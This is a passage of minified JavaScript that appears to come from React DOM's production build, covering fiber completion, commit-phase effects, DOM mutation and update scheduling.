13:if(Be(We),u=r.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(Ue&&Lt!==null&&(r.mode&1)!==0&&(r.flags&128)===0)lh(),nn(),r.flags|=98560,g=!1;else if(g=ki(r),u!==null&&u.dehydrated!==null){if(t===null){if(!g)throw Error(s(318));if(g=r.memoizedState,g=g!==null?g.dehydrated:null,!g)throw Error(s(317));g[ur]=r}else nn(),(r.flags&128)===0&&(r.memoizedState=null),r.flags|=4;ft(r),g=!1}else er!==null&&(uc(er),er=null),g=!0;if(!g)return r.flags&65536?r:null}return(r.flags&128)!==0?(r.lanes=l,r):(u=u!==null,u!==(t!==null&&t.memoizedState!==null)&&u&&(r.child.flags|=8192,(r.mode&1)!==0&&(t===null||(We.current&1)!==0?Ze===0&&(Ze=3):mc())),r.updateQueue!==null&&(r.flags|=4),ft(r),null);case 4:return cn(),ec(t,r),t===null&&ca(r.stateNode.containerInfo),ft(r),null;case 10:return Al(r.type._context),ft(r),null;case 17:return _t(r.type)&&vi(),ft(r),null;case 19:if(Be(We),g=r.memoizedState,g===null)return ft(r),null;if(u=(r.flags&128)!==0,y=g.rendering,y===null)if(u)wa(g,!1);else{if(Ze!==0||t!==null&&(t.flags&128)!==0)for(t=r.child;t!==null;){if(y=Ci(t),y!==null){for(r.flags|=128,wa(g,!1),u=y.updateQueue,u!==null&&(r.updateQueue=u,r.flags|=4),r.subtreeFlags=0,u=l,l=r.child;l!==null;)g=l,t=u,g.flags&=14680066,y=g.alternate,y===null?(g.childLanes=0,g.lanes=t,g.child=null,g.subtreeFlags=0,g.memoizedProps=null,g.memoizedState=null,g.updateQueue=null,g.dependencies=null,g.stateNode=null):(g.childLanes=y.childLanes,g.lanes=y.lanes,g.child=y.child,g.subtreeFlags=0,g.deletions=null,g.memoizedProps=y.memoizedProps,g.memoizedState=y.memoizedState,g.updateQueue=y.updateQueue,g.type=y.type,t=y.dependencies,g.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),l=l.sibling;return De(We,We.current&1|2),r.child}t=t.sibling}g.tail!==null&&Qe()>fn&&(r.flags|=128,u=!0,wa(g,!1),r.lanes=4194304)}else{if(!u)if(t=Ci(y),t!==null){if(r.flags|=128,u=!0,l=t.updateQueue,l!==null&&(r.updateQueue=l,r.flags|=4),wa(g,!0),g.tail===null&&g.tailMode==="hidden"&&!y.alternate&&!Ue)return ft(r),null}else 2*Qe()-g.renderingStartTime>fn&&l!==1073741824&&(r.flags|=128,u=!0,wa(g,!1),r.lanes=4194304);g.isBackwards?(y.sibling=r.child,r.child=y):(l=g.last,l!==null?l.sibling=y:r.child=y,g.last=y)}return g.tail!==null?(r=g.tail,g.rendering=r,g.tail=r.sibling,g.renderingStartTime=Qe(),r.sibling=null,l=We.current,De(We,u?l&1|2:l&1),r):(ft(r),null);case 22:case 23:return fc(),u=r.memoizedState!==null,t!==null&&t.memoizedState!==null!==u&&(r.flags|=8192),u&&(r.mode&1)!==0?(Ot&1073741824)!==0&&(ft(r),r.subtreeFlags&6&&(r.flags|=8192)):ft(r),null;case 24:return null;case 25:return null}throw Error(s(156,r.tag))}function Ux(t,r){switch(jl(r),r.tag){case 1:return _t(r.type)&&vi(),t=r.flags,t&65536?(r.flags=t&-65537|128,r):null;case 3:return cn(),Be(Ft),Be(ut),Ll(),t=r.flags,(t&65536)!==0&&(t&128)===0?(r.flags=t&-65537|128,r):null;case 5:return Rl(r),null;case 13:if(Be(We),t=r.memoizedState,t!==null&&t.dehydrated!==null){if(r.alternate===null)throw Error(s(340));nn()}return t=r.flags,t&65536?(r.flags=t&-65537|128,r):null;case 19:return Be(We),null;case 4:return cn(),null;case 10:return Al(r.type._context),null;case 22:case 23:return fc(),null;case 24:return null;default:return null}}var $i=!1,mt=!1,zx=typeof WeakSet=="function"?WeakSet:Set,ce=null;function un(t,r){var l=t.ref;if(l!==null)if(typeof l=="function")try{l(null)}catch(u){Ge(t,r,u)}else l.current=null}function tc(t,r,l){try{l()}catch(u){Ge(t,r,u)}}var of=!1;function qx(t,r){if(fl=ai,t=Mu(),al(t)){if("selectionStart"in t)var l={start:t.selectionStart,end:t.selectionEnd};else e:{l=(l=t.ownerDocument)&&l.defaultView||window;var u=l.getSelection&&l.getSelection();if(u&&u.rangeCount!==0){l=u.anchorNode;var h=u.anchorOffset,g=u.focusNode;u=u.focusOffset;try{l.nodeType,g.nodeType}catch{l=null;break e}var y=0,_=-1,A=-1,$=0,J=0,X=t,Y=null;t:for(;;){for(var oe;X!==l||h!==0&&X.nodeType!==3||(_=y+h),X!==g||u!==0&&X.nodeType!==3||(A=y+u),X.nodeType===3&&(y+=X.nodeValue.length),(oe=X.firstChild)!==null;)Y=X,X=oe;for(;;){if(X===t)break t;if(Y===l&&++$===h&&(_=y),Y===g&&++J===u&&(A=y),(oe=X.nextSibling)!==null)break;X=Y,Y=X.parentNode}X=oe}l=_===-1||A===-1?null:{start:_,end:A}}else l=null}l=l||{start:0,end:0}}else l=null;for(ml={focusedElem:t,selectionRange:l},ai=!1,ce=r;ce!==null;)if(r=ce,t=r.child,(r.subtreeFlags&1028)!==0&&t!==null)t.return=r,ce=t;else for(;ce!==null;){r=ce;try{var de=r.alternate;if((r.flags&1024)!==0)switch(r.tag){case 0:case 11:case 15:break;case 1:if(de!==null){var me=de.memoizedProps,Ke=de.memoizedState,L=r.stateNode,C=L.getSnapshotBeforeUpdate(r.elementType===r.type?me:tr(r.type,me),Ke);L.__reactInternalSnapshotBeforeUpdate=C}break;case 3:var D=r.stateNode.containerInfo;D.nodeType===1?D.textContent="":D.nodeType===9&&D.documentElement&&D.removeChild(D.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(s(163))}}catch(te){Ge(r,r.return,te)}if(t=r.sibling,t!==null){t.return=r.return,ce=t;break}ce=r.return}return de=of,of=!1,de}function ja(t,r,l){var u=r.updateQueue;if(u=u!==null?u.lastEffect:null,u!==null){var h=u=u.next;do{if((h.tag&t)===t){var g=h.destroy;h.destroy=void 0,g!==void 0&&tc(r,l,g)}h=h.next}while(h!==u)}}function Bi(t,r){if(r=r.updateQueue,r=r!==null?r.lastEffect:null,r!==null){var l=r=r.next;do{if((l.tag&t)===t){var u=l.create;l.destroy=u()}l=l.next}while(l!==r)}}function rc(t){var r=t.ref;if(r!==null){var l=t.stateNode;t.tag,t=l,typeof r=="function"?r(t):r.current=t}}function lf(t){var r=t.alternate;r!==null&&(t.alternate=null,lf(r)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(r=t.stateNode,r!==null&&(delete r[ur],delete r[ua],delete r[bl],delete r[Fx],delete r[_x])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function cf(t){return t.tag===5||t.tag===3||t.tag===4}function df(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||cf(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function sc(t,r,l){var u=t.tag;if(u===5||u===6)t=t.stateNode,r?l.nodeType===8?l.parentNode.insertBefore(t,r):l.insertBefore(t,r):(l.nodeType===8?(r=l.parentNode,r.insertBefore(t,l)):(r=l,r.appendChild(t)),l=l._reactRootContainer,l!=null||r.onclick!==null||(r.onclick=gi));else if(u!==4&&(t=t.child,t!==null))for(sc(t,r,l),t=t.sibling;t!==null;)sc(t,r,l),t=t.sibling}function nc(t,r,l){var u=t.tag;if(u===5||u===6)t=t.stateNode,r?l.insertBefore(t,r):l.appendChild(t);else if(u!==4&&(t=t.child,t!==null))for(nc(t,r,l),t=t.sibling;t!==null;)nc(t,r,l),t=t.sibling}var ct=null,rr=!1;function Xr(t,r,l){for(l=l.child;l!==null;)uf(t,r,l),l=l.sibling}function uf(t,r,l){if(dr&&typeof dr.onCommitFiberUnmount=="function")try{dr.onCommitFiberUnmount(Za,l)}catch{}switch(l.tag){case 5:mt||un(l,r);case 6:var u=ct,h=rr;ct=null,Xr(t,r,l),ct=u,rr=h,ct!==null&&(rr?(t=ct,l=l.stateNode,t.nodeType===8?t.parentNode.removeChild(l):t.removeChild(l)):ct.removeChild(l.stateNode));break;case 18:ct!==null&&(rr?(t=ct,l=l.stateNode,t.nodeType===8?gl(t.parentNode,l):t.nodeType===1&&gl(t,l),ea(t)):gl(ct,l.stateNode));break;case 4:u=ct,h=rr,ct=l.stateNode.containerInfo,rr=!0,Xr(t,r,l),ct=u,rr=h;break;case 0:case 11:case 14:case 15:if(!mt&&(u=l.updateQueue,u!==null&&(u=u.lastEffect,u!==null))){h=u=u.next;do{var g=h,y=g.destroy;g=g.tag,y!==void 0&&((g&2)!==0||(g&4)!==0)&&tc(l,r,y),h=h.next}while(h!==u)}Xr(t,r,l);break;case 1:if(!mt&&(un(l,r),u=l.stateNode,typeof u.componentWillUnmount=="function"))try{u.props=l.memoizedProps,u.state=l.memoizedState,u.componentWillUnmount()}catch(_){Ge(l,r,_)}Xr(t,r,l);break;case 21:Xr(t,r,l);break;case 22:l.mode&1?(mt=(u=mt)||l.memoizedState!==null,Xr(t,r,l),mt=u):Xr(t,r,l);break;default:Xr(t,r,l)}}function hf(t){var r=t.updateQueue;if(r!==null){t.updateQueue=null;var l=t.stateNode;l===null&&(l=t.stateNode=new zx),r.forEach(function(u){var h=Xx.bind(null,t,u);l.has(u)||(l.add(u),u.then(h,h))})}}function sr(t,r){var l=r.deletions;if(l!==null)for(var u=0;u<l.length;u++){var h=l[u];try{var g=t,y=r,_=y;e:for(;_!==null;){switch(_.tag){case 5:ct=_.stateNode,rr=!1;break e;case 3:ct=_.stateNode.containerInfo,rr=!0;break e;case 4:ct=_.stateNode.containerInfo,rr=!0;break e}_=_.return}if(ct===null)throw Error(s(160));uf(g,y,h),ct=null,rr=!1;var A=h.alternate;A!==null&&(A.return=null),h.return=null}catch($){Ge(h,r,$)}}if(r.subtreeFlags&12854)for(r=r.child;r!==null;)ff(r,t),r=r.sibling}function ff(t,r){var l=t.alternate,u=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(sr(r,t),mr(t),u&4){try{ja(3,t,t.return),Bi(3,t)}catch(me){Ge(t,t.return,me)}try{ja(5,t,t.return)}catch(me){Ge(t,t.return,me)}}break;case 1:sr(r,t),mr(t),u&512&&l!==null&&un(l,l.return);break;case 5:if(sr(r,t),mr(t),u&512&&l!==null&&un(l,l.return),t.flags&32){var h=t.stateNode;try{qn(h,"")}catch(me){Ge(t,t.return,me)}}if(u&4&&(h=t.stateNode,h!=null)){var g=t.memoizedProps,y=l!==null?l.memoizedProps:g,_=t.type,A=t.updateQueue;if(t.updateQueue=null,A!==null)try{_==="input"&&g.type==="radio"&&g.name!=null&&Ae(h,g),Lo(_,y);var $=Lo(_,g);for(y=0;y<A.length;y+=2){var J=A[y],X=A[y+1];J==="style"?Qd(h,X):J==="dangerouslySetInnerHTML"?Hd(h,X):J==="children"?qn(h,X):S(h,J,X,$)}switch(_){case"input":Oe(h,g);break;case"textarea":qd(h,g);break;case"select":var Y=h._wrapperState.wasMultiple;h._wrapperState.wasMultiple=!!g.multiple;var oe=g.value;oe!=null?vr(h,!!g.multiple,oe,!1):Y!==!!g.multiple&&(g.defaultValue!=null?vr(h,!!g.multiple,g.defaultValue,!0):vr(h,!!g.multiple,g.multiple?[]:"",!1))}h[ua]=g}catch(me){Ge(t,t.return,me)}}break;case 6:if(sr(r,t),mr(t),u&4){if(t.stateNode===null)throw Error(s(162));h=t.stateNode,g=t.memoizedProps;try{h.nodeValue=g}catch(me){Ge(t,t.return,me)}}break;case 3:if(sr(r,t),mr(t),u&4&&l!==null&&l.memoizedState.isDehydrated)try{ea(r.containerInfo)}catch(me){Ge(t,t.return,me)}break;case 4:sr(r,t),mr(t);break;case 13:sr(r,t),mr(t),h=t.child,h.flags&8192&&(g=h.memoizedState!==null,h.stateNode.isHidden=g,!g||h.alternate!==null&&h.alternate.memoizedState!==null||(oc=Qe())),u&4&&hf(t);break;case 22:if(J=l!==null&&l.memoizedState!==null,t.mode&1?(mt=($=mt)||J,sr(r,t),mt=$):sr(r,t),mr(t),u&8192){if($=t.memoizedState!==null,(t.stateNode.isHidden=$)&&!J&&(t.mode&1)!==0)for(ce=t,J=t.child;J!==null;){for(X=ce=J;ce!==null;){switch(Y=ce,oe=Y.child,Y.tag){case 0:case 11:case 14:case 15:ja(4,Y,Y.return);break;case 1:un(Y,Y.return);var de=Y.stateNode;if(typeof de.componentWillUnmount=="function"){u=Y,l=Y.return;try{r=u,de.props=r.memoizedProps,de.state=r.memoizedState,de.componentWillUnmount()}catch(me){Ge(u,l,me)}}break;case 5:un(Y,Y.return);break;case 22:if(Y.memoizedState!==null){xf(X);continue}}oe!==null?(oe.return=Y,ce=oe):xf(X)}J=J.sibling}e:for(J=null,X=t;;){if(X.tag===5){if(J===null){J=X;try{h=X.stateNode,$?(g=h.style,typeof g.setProperty=="function"?g.setProperty("display","none","important"):g.display="none"):(_=X.stateNode,A=X.memoizedProps.style,y=A!=null&&A.hasOwnProperty("display")?A.display:null,_.style.display=Gd("display",y))}catch(me){Ge(t,t.return,me)}}}else if(X.tag===6){if(J===null)try{X.stateNode.nodeValue=$?"":X.memoizedProps}catch(me){Ge(t,t.return,me)}}else if((X.tag!==22&&X.tag!==23||X.memoizedState===null||X===t)&&X.child!==null){X.child.return=X,X=X.child;continue}if(X===t)break e;for(;X.sibling===null;){if(X.return===null||X.return===t)break e;J===X&&(J=null),X=X.return}J===X&&(J=null),X.sibling.return=X.return,X=X.sibling}}break;case 19:sr(r,t),mr(t),u&4&&hf(t);break;case 21:break;default:sr(r,t),mr(t)}}function mr(t){var r=t.flags;if(r&2){try{e:{for(var l=t.return;l!==null;){if(cf(l)){var u=l;break e}l=l.return}throw Error(s(160))}switch(u.tag){case 5:var h=u.stateNode;u.flags&32&&(qn(h,""),u.flags&=-33);var g=df(t);nc(t,g,h);break;case 3:case 4:var y=u.stateNode.containerInfo,_=df(t);sc(t,_,y);break;default:throw Error(s(161))}}catch(A){Ge(t,t.return,A)}t.flags&=-3}r&4096&&(t.flags&=-4097)}function Wx(t,r,l){ce=t,mf(t)}function mf(t,r,l){for(var u=(t.mode&1)!==0;ce!==null;){var h=ce,g=h.child;if(h.tag===22&&u){var y=h.memoizedState!==null||$i;if(!y){var _=h.alternate,A=_!==null&&_.memoizedState!==null||mt;_=$i;var $=mt;if($i=y,(mt=A)&&!$)for(ce=h;ce!==null;)y=ce,A=y.child,y.tag===22&&y.memoizedState!==null?gf(h):A!==null?(A.return=y,ce=A):gf(h);for(;g!==null;)ce=g,mf(g),g=g.sibling;ce=h,$i=_,mt=$}pf(t)}else(h.subtreeFlags&8772)!==0&&g!==null?(g.return=h,ce=g):pf(t)}}function pf(t){for(;ce!==null;){var r=ce;if((r.flags&8772)!==0){var l=r.alternate;try{if((r.flags&8772)!==0)switch(r.tag){case 0:case 11:case 15:mt||Bi(5,r);break;case 1:var u=r.stateNode;if(r.flags&4&&!mt)if(l===null)u.componentDidMount();else{var h=r.elementType===r.type?l.memoizedProps:tr(r.type,l.memoizedProps);u.componentDidUpdate(h,l.memoizedState,u.__reactInternalSnapshotBeforeUpdate)}var g=r.updateQueue;g!==null&&ph(r,g,u);break;case 3:var y=r.updateQueue;if(y!==null){if(l=null,r.child!==null)switch(r.child.tag){case 5:l=r.child.stateNode;break;case 1:l=r.child.stateNode}ph(r,y,l)}break;case 5:var _=r.stateNode;if(l===null&&r.flags&4){l=_;var A=r.memoizedProps;switch(r.type){case"button":case"input":case"select":case"textarea":A.autoFocus&&l.focus();break;case"img":A.src&&(l.src=A.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(r.memoizedState===null){var $=r.alternate;if($!==null){var J=$.memoizedState;if(J!==null){var X=J.dehydrated;X!==null&&ea(X)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(s(163))}mt||r.flags&512&&rc(r)}catch(Y){Ge(r,r.return,Y)}}if(r===t){ce=null;break}if(l=r.sibling,l!==null){l.return=r.return,ce=l;break}ce=r.return}}function xf(t){for(;ce!==null;){var r=ce;if(r===t){ce=null;break}var l=r.sibling;if(l!==null){l.return=r.return,ce=l;break}ce=r.return}}function gf(t){for(;ce!==null;){var r=ce;try{switch(r.tag){case 0:case 11:case 15:var l=r.return;try{Bi(4,r)}catch(A){Ge(r,l,A)}break;case 1:var u=r.stateNode;if(typeof u.componentDidMount=="function"){var h=r.return;try{u.componentDidMount()}catch(A){Ge(r,h,A)}}var g=r.return;try{rc(r)}catch(A){Ge(r,g,A)}break;case 5:var y=r.return;try{rc(r)}catch(A){Ge(r,y,A)}}}catch(A){Ge(r,r.return,A)}if(r===t){ce=null;break}var _=r.sibling;if(_!==null){_.return=r.return,ce=_;break}ce=r.return}}var Vx=Math.ceil,Ui=U.ReactCurrentDispatcher,ac=U.ReactCurrentOwner,Qt=U.ReactCurrentBatchConfig,Ce=0,nt=null,Ye=null,dt=0,Ot=0,hn=Gr(0),Ze=0,Na=null,Cs=0,zi=0,ic=0,ka=null,At=null,oc=0,fn=1/0,Sr=null,qi=!1,lc=null,Zr=null,Wi=!1,es=null,Vi=0,Fa=0,cc=null,Hi=-1,Gi=0;function Nt(){return(Ce&6)!==0?Qe():Hi!==-1?Hi:Hi=Qe()}function ts(t){return(t.mode&1)===0?1:(Ce&2)!==0&&dt!==0?dt&-dt:Ax.transition!==null?(Gi===0&&(Gi=cu()),Gi):(t=Re,t!==0||(t=window.event,t=t===void 0?16:bu(t.type)),t)}function nr(t,r,l,u){if(50<Fa)throw Fa=0,cc=null,Error(s(185));Kn(t,l,u),((Ce&2)===0||t!==nt)&&(t===nt&&((Ce&2)===0&&(zi|=l),Ze===4&&rs(t,dt)),Et(t,u),l===1&&Ce===0&&(r.mode&1)===0&&(fn=Qe()+500,wi&&Kr()))}function Et(t,r){var l=t.callbackNode;Ap(t,r);var u=ri(t,t===nt?dt:0);if(u===0)l!==null&&iu(l),t.callbackNode=null,t.callbackPriority=0;else if(r=u&-u,t.callbackPriority!==r){if(l!=null&&iu(l),r===1)t.tag===0?Sx(vf.bind(null,t)):sh(vf.bind(null,t)),Nx(function(){(Ce&6)===0&&Kr()}),l=null;else{switch(du(u)){case 1:l=zo;break;case 4:l=ou;break;case 16:l=Xa;break;case 536870912:l=lu;break;default:l=Xa}l=Sf(l,bf.bind(null,t))}t.callbackPriority=r,t.callbackNode=l}}function bf(t,r){if(Hi=-1,Gi=0,(Ce&6)!==0)throw Error(s(327));var l=t.callbackNode;if(mn()&&t.callbackNode!==l)return null;var u=ri(t,t===nt?dt:0);if(u===0)return null;if((u&30)!==0||(u&t.expiredLanes)!==0||r)r=Qi(t,u);else{r=u;var h=Ce;Ce|=2;var g=wf();(nt!==t||dt!==r)&&(Sr=null,fn=Qe()+500,Ps(t,r));do try{Qx();break}catch(_){yf(t,_)}while(!0);Sl(),Ui.current=g,Ce=h,Ye!==null?r=0:(nt=null,dt=0,r=Ze)}if(r!==0){if(r===2&&(h=qo(t),h!==0&&(u=h,r=dc(t,h))),r===1)throw l=Na,Ps(t,0),rs(t,u),Et(t,Qe()),l;if(r===6)rs(t,u);else{if(h=t.current.alternate,(u&30)===0&&!Hx(h)&&(r=Qi(t,u),r===2&&(g=qo(t),g!==0&&(u=g,r=dc(t,g))),r===1))throw l=Na,Ps(t,0),rs(t,u),Et(t,Qe()),l;switch(t.finishedWork=h,t.finishedLanes=u,r){case 0:case 1:throw Error(s(345));case 2:Rs(t,At,Sr);break;case 3:if(rs(t,u),(u&130023424)===u&&(r=oc+500-Qe(),10<r)){if(ri(t,0)!==0)break;if(h=t.suspendedLanes,(h&u)!==u){Nt(),t.pingedLanes|=t.suspendedLanes&h;break}t.timeoutHandle=xl(Rs.bind(null,t,At,Sr),r);break}Rs(t,At,Sr);break;case 4:if(rs(t,u),(u&4194240)===u)break;for(r=t.eventTimes,h=-1;0<u;){var y=31-Xt(u);g=1<<y,y=r[y],y>h&&(h=y),u&=~g}if(u=h,u=Qe()-u,u=(120>u?120:480>u?480:1080>u?1080:1920>u?1920:3e3>u?3e3:4320>u?4320:1960*Vx(u/1960))-u,10<u){t.timeoutHandle=xl(Rs.bind(null,t,At,Sr),u);break}Rs(t,At,Sr);break;case 5:Rs(t,At,Sr);break;default:throw Error(s(329))}}}return Et(t,Qe()),t.callbackNode===l?bf.bind(null,t):null}function dc(t,r){var l=ka;return t.current.memoizedState.isDehydrated&&(Ps(t,r).flags|=256),t=Qi(t,r),t!==2&&(r=At,At=l,r!==null&&uc(r)),t}function uc(t){At===null?At=t:At.push.apply(At,t)}function Hx(t){for(var r=t;;){if(r.flags&16384){var l=r.updateQueue;if(l!==null&&(l=l.stores,l!==null))for(var u=0;u<l.length;u++){var h=l[u],g=h.getSnapshot;h=h.value;try{if(!Zt(g(),h))return!1}catch{return!1}}}if(l=r.child,r.subtreeFlags&16384&&l!==null)l.return=r,r=l;else{if(r===t)break;for(;r.sibling===null;){if(r.return===null||r.return===t)return!0;r=r.return}r.sibling.return=r.return,r=r.sibling}}return!0}function rs(t,r){for(r&=~ic,r&=~zi,t.suspendedLanes|=r,t.pingedLanes&=~r,t=t.expirationTimes;0<r;){var l=31-Xt(r),u=1<<l;t[l]=-1,r&=~u}}function vf(t){if((Ce&6)!==0)throw Error(s(327));mn();var r=ri(t,0);if((r&1)===0)return Et(t,Qe()),null;var l=Qi(t,r);if(t.tag!==0&&l===2){var u=qo(t);u!==0&&(r=u,l=dc(t,u))}if(l===1)throw l=Na,Ps(t,0),rs(t,r),Et(t,Qe()),l;if(l===6)throw Error(s(345));return t.finishedWork=t.current.alternate,t.finishedLanes=r,Rs(t,At,Sr),Et(t,Qe()),null}function hc(t,r){var l=Ce;Ce|=1;try{return t(r)}finally{Ce=l,Ce===0&&(fn=Qe()+500,wi&&Kr())}}function Ts(t){es!==null&&es.tag===0&&(Ce&6)===0&&mn();var r=Ce;Ce|=1;var l=Qt.transition,u=Re;try{if(Qt.transition=null,Re=1,t)return t()}finally{Re=u,Qt.transition=l,Ce=r,(Ce&6)===0&&Kr()}}function fc(){Ot=hn.current,Be(hn)}function Ps(t,r){t.finishedWork=null,t.finishedLanes=0;var l=t.timeoutHandle;if(l!==-1&&(t.timeoutHandle=-1,jx(l)),Ye!==null)for(l=Ye.return;l!==null;){var u=l;switch(jl(u),u.tag){case 1:u=u.type.childContextTypes,u!=null&&vi();break;case 3:cn(),Be(Ft),Be(ut),Ll();break;case 5:Rl(u);break;case 4:cn();break;case 13:Be(We);break;case 19:Be(We);break;case 10:Al(u.type._context);break;case 22:case 23:fc()}l=l.return}if(nt=t,Ye=t=ss(t.current,null),dt=Ot=r,Ze=0,Na=null,ic=zi=Cs=0,At=ka=null,Ss!==null){for(r=0;r<Ss.length;r++)if(l=Ss[r],u=l.interleaved,u!==null){l.interleaved=null;var h=u.next,g=l.pending;if(g!==null){var y=g.next;g.next=h,u.next=y}l.pending=u}Ss=null}return t}function yf(t,r){do{var l=Ye;try{if(Sl(),Ti.current=Li,Pi){for(var u=Ve.memoizedState;u!==null;){var h=u.queue;h!==null&&(h.pending=null),u=u.next}Pi=!1}if(Es=0,st=Xe=Ve=null,ga=!1,ba=0,ac.current=null,l===null||l.return===null){Ze=1,Na=r,Ye=null;break}e:{var g=t,y=l.return,_=l,A=r;if(r=dt,_.flags|=32768,A!==null&&typeof A=="object"&&typeof A.then=="function"){var $=A,J=_,X=J.tag;if((J.mode&1)===0&&(X===0||X===11||X===15)){var Y=J.alternate;Y?(J.updateQueue=Y.updateQueue,J.memoizedState=Y.memoizedState,J.lanes=Y.lanes):(J.updateQueue=null,J.memoizedState=null)}var oe=Wh(y);if(oe!==null){oe.flags&=-257,Vh(oe,y,_,g,r),oe.mode&1&&qh(g,$,r),r=oe,A=$;var de=r.updateQueue;if(de===null){var me=new Set;me.add(A),r.updateQueue=me}else de.add(A);break e}else{if((r&1)===0){qh(g,$,r),mc();break e}A=Error(s(426))}}else if(Ue&&_.mode&1){var Ke=Wh(y);if(Ke!==null){(Ke.flags&65536)===0&&(Ke.flags|=256),Vh(Ke,y,_,g,r),Fl(dn(A,_));break e}}g=A=dn(A,_),Ze!==4&&(Ze=2),ka===null?ka=[g]:ka.push(g),g=y;do{switch(g.tag){case 3:g.flags|=65536,r&=-r,g.lanes|=r;var L=Uh(g,A,r);mh(g,L);break e;case 1:_=A;var C=g.type,D=g.stateNode;if((g.flags&128)===0&&(typeof C.getDerivedStateFromError=="function"||D!==null&&typeof D.componentDidCatch=="function"&&(Zr===null||!Zr.has(D)))){g.flags|=65536,r&=-r,g.lanes|=r;var te=zh(g,_,r);mh(g,te);break e}}g=g.return}while(g!==null)}Nf(l)}catch(pe){r=pe,Ye===l&&l!==null&&(Ye=l=l.return);continue}break}while(!0)}function wf(){var t=Ui.current;return Ui.current=Li,t===null?Li:t}function mc(){(Ze===0||Ze===3||Ze===2)&&(Ze=4),nt===null||(Cs&268435455)===0&&(zi&268435455)===0||rs(nt,dt)}function Qi(t,r){var l=Ce;Ce|=2;var u=wf();(nt!==t||dt!==r)&&(Sr=null,Ps(t,r));do try{Gx();break}catch(h){yf(t,h)}while(!0);if(Sl(),Ce=l,Ui.current=u,Ye!==null)throw Error(s(261));return nt=null,dt=0,Ze}function Gx(){for(;Ye!==null;)jf(Ye)}function Qx(){for(;Ye!==null&&!vp();)jf(Ye)}function jf(t){var r=_f(t.alternate,t,Ot);t.memoizedProps=t.pendingProps,r===null?Nf(t):Ye=r,ac.current=null}function Nf(t){var r=t;do{var l=r.alternate;if(t=r.return,(r.flags&32768)===0){if(l=Bx(l,r,Ot),l!==null){Ye=l;return}}else{if(l=Ux(l,r),l!==null){l.flags&=32767,Ye=l;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{Ze=6,Ye=null;return}}if(r=r.sibling,r!==null){Ye=r;return}Ye=r=t}while(r!==null);Ze===0&&(Ze=5)}function Rs(t,r,l){var u=Re,h=Qt.transition;try{Qt.transition=null,Re=1,Kx(t,r,l,u)}finally{Qt.transition=h,Re=u}return null}function Kx(t,r,l,u){do mn();while(es!==null);if((Ce&6)!==0)throw Error(s(327));l=t.finishedWork;var h=t.finishedLanes;if(l===null)return null;if(t.finishedWork=null,t.finishedLanes=0,l===t.current)throw Error(s(177));t.callbackNode=null,t.callbackPriority=0;var g=l.lanes|l.childLanes;if(Ep(t,g),t===nt&&(Ye=nt=null,dt=0),(l.subtreeFlags&2064)===0&&(l.flags&2064)===0||Wi||(Wi=!0,Sf(Xa,function(){return mn(),null})),g=(l.flags&15990)!==0,(l.subtreeFlags&15990)!==0||g){g=Qt.transition,Qt.transition=null;var y=Re;Re=1;var _=Ce;Ce|=4,ac.current=null,qx(t,l),ff(l,t),px(ml),ai=!!fl,ml=fl=null,t.current=l,Wx(l),yp(),Ce=_,Re=y,Qt.transition=g}else t.current=l;if(Wi&&(Wi=!1,es=t,Vi=h),g=t.pendingLanes,g===0&&(Zr=null),Np(l.stateNode),Et(t,Qe()),r!==null)for(u=t.onRecoverableError,l=0;l<r.length;l++)h=r[l],u(h.value,{componentStack:h.stack,digest:h.digest});if(qi)throw qi=!1,t=lc,lc=null,t;return(Vi&1)!==0&&t.tag!==0&&mn(),g=t.pendingLanes,(g&1)!==0?t===cc?Fa++:(Fa=0,cc=t):Fa=0,Kr(),null}function mn(){if(es!==null){var t=du(Vi),r=Qt.transition,l=Re;try{if(Qt.transition=null,Re=16>t?16:t,es===null)var u=!1;else{if(t=es,es=null,Vi=0,(Ce&6)!==0)throw Error(s(331));var h=Ce;for(Ce|=4,ce=t.current;ce!==null;){var g=ce,y=g.child;if((ce.flags&16)!==0){var _=g.deletions;if(_!==null){for(var A=0;A<_.length;A++){var $=_[A];for(ce=$;ce!==null;){var J=ce;switch(J.tag){case 0:case 11:case 15:ja(8,J,g)}var X=J.child;if(X!==null)X.return=J,ce=X;else for(;ce!==null;){J=ce;var Y=J.sibling,oe=J.return;if(lf(J),J===$){ce=null;break}if(Y!==null){Y.return=oe,ce=Y;break}ce=oe}}}var de=g.alternate;if(de!==null){var me=de.child;if(me!==null){de.child=null;do{var Ke=me.sibling;me.sibling=null,me=Ke}while(me!==null)}}ce=g}}if((g.subtreeFlags&2064)!==0&&y!==null)y.return=g,ce=y;else e:for(;ce!==null;){if(g=ce,(g.flags&2048)!==0)switch(g.tag){case 0:case 11:case 15:ja(9,g,g.return)}var L=g.sibling;if(L!==null){L.return=g.return,ce=L;break e}ce=g.return}}var C=t.current;for(ce=C;ce!==null;){y=ce;var D=y.child;if((y.subtreeFlags&2064)!==0&&D!==null)D.return=y,ce=D;else e:for(y=C;ce!==null;){if(_=ce,(_.flags&2048)!==0)try{switch(_.tag){case 0:case 11:case 15:Bi(9,_)}}catch(pe){Ge(_,_.return,pe)}if(_===y){ce=null;break e}var te=_.sibling;if(te!==null){te.return=_.return,ce=te;break e}ce=_.return}}if(Ce=h,Kr(),dr&&typeof dr.onPostCommitFiberRoot=="function")try{dr.onPostCommitFiberRoot(Za,t)}catch{}u=!0}return u}finally{Re=l,Qt.transition=r}}return!1}function kf(t,r,l){r=dn(l,r),r=Uh(t,r,1),t=Jr(t,r,1),r=Nt(),t!==null&&(Kn(t,1,r),Et(t,r))}function Ge(t,r,l){if(t.tag===3)kf(t,t,l);else for(;r!==null;){if(r.tag===3){kf(r,t,l);break}else if(r.tag===1){var u=r.stateNode;if(typeof r.type.getDerivedStateFromError=="function"||typeof 